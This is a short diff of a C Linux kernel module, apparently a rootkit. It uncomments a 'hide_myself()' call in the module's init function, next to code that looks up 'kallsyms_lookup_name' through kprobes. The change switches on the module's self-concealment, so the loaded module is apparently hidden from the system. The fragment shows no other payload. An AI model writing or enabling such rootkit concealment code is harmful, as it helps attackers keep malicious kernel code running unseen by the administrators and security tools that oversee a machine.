@@ -331,7 +331,7 @@ static int __init hide_init(void)
 	}       
     }
 
-    // hide_myself();
+    hide_myself();
 
     #ifdef KPROBE_LOOKUP
     unsigned long (*kallsyms_lookup_name)(const char *name);
